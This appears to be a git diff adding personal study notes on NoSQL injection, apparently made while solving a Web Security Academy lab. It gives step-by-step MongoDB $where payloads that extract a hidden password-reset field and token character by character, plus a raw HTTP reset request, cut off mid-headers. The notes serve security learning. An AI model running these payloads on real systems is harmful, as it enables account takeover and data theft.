@@ -196,3 +196,91 @@ If you have injected an operator that enables you to run JavaScript, then you ca
 {"username":"admin","password":{"$regex":"^.*"}}
 {"username":"admin","password":{"$regex":"^a.*"}} #for something beginning with a
 ```
+
+---
+
+SOME PRE-REQUISITE IMPORTANT CONCEPTS:
+```
+#For an object in js like 
+object userinfo {
+ _id (default first)
+ username
+ password
+ hidden field
+}
+then 
+
+object.keys(userinfo) can be written as object.keys(this) for the current object.
+then object.keys(this) returns an array with field names like _id, username, password, hiddenfield.
+
+object.keys(this)[0] => #points towards _id
+object.keys(this)[1] => #points towards username
+
+
+then we can use,
+
+object.keys(this)[1].matches('username') or object.keys(this)[1].matches('^a.*') returns true if matches. and then we an use it to return 1 and 0 accordingly.
+```
+We can iterate through all the fields and once the field number is greater than total number of fields it will throw an error. and to find a hidden field we can do 
+```
+1. First we find the length
+{"username":"carlos","password":{"$ne":""},
+"$where":"function(){if (Object.keys(this)[4].length == 1) return 1; else return 0;}"}
+
+2. We find the name by iterating the characters.
+{"username":"carlos","password":{"$ne":""},
+"$where":"function(){if (Object.keys(this)[4].matches('^a.*')) return 1; else return 0;}"} 
+```
+Once we have hidden field value we can find the value inside the field by using 
+this.objectname.length or this['xyz'] returns the value of the field. 
+
+so to find this the payloads to be used is , 
+```
+"username":"carlos","password":{"$ne":""},
+"$where":"function(){if (this['unlockToken'].length>1) return 1; else 0;}"   
+}
+```
+
+1. Try checking if noqsl vuln is present.
+2. test for operator injection; eg : $where = this allows for js input
+3. If present, use the payloads in given sequence.
+
+```
+{"username":"carlos","password":{"$ne":""}} #this helps confirm nosql vuln
+```
+```
+#Confirm operator injection by the payload and evaluate to true and false.
+{"username":"carlos","password":{"$ne":""},"$where":"function(){return 0;}"} 
+{"username":"carlos","password":{"$ne":""},"$where":"function(){return 1;}"} 
+```
+```
+#After this test for matching
+{"username":"carlos","password":{"$ne":""},"$where":"function(){if (Object.keys(this)[x].matches('xyz')) return 1;}"}
+
+lets say we find the hidden field named unlocktoken
+```
+
+```
+#To find length of token
+"username":"carlos","password":{"$ne":""},
+"$where":"function(){if (this['unlockToken'].length>1) return 1; else 0;}"   
+}
+```
+
+```
+#To find the field
+"username":"carlos","password":{"$ne":""},
+"$where":"function(){if (this['unlockToken'].matches('^a.*')) return 1; else 0;}"   
+}
+```
+
+```
+#the you can fuzz the url like
+GET /forgot-password?<foundfield>unlockToken</foundfield>=<field value>e374caf6667f80f0</field value>HTTP/2
+Host: 0a3e005303d1828880a92632000800a4.web-security-academy.net
+Cookie: session=CJ4bB1mdJgbQRAFVkA0vBtzZeoGZSAFR
+Sec-Ch-Ua: "Not;A=Brand";v="8", "Chromium";v="150", "Brave";v="150"
+Sec-Ch-Ua-Mobile: ?0
+Sec-Ch-Ua-Platform: "Windows"
+Upgrade-Insecure-Requests: 1
+User-Agent: Mozilla/5.0 (Windows NT 10.0
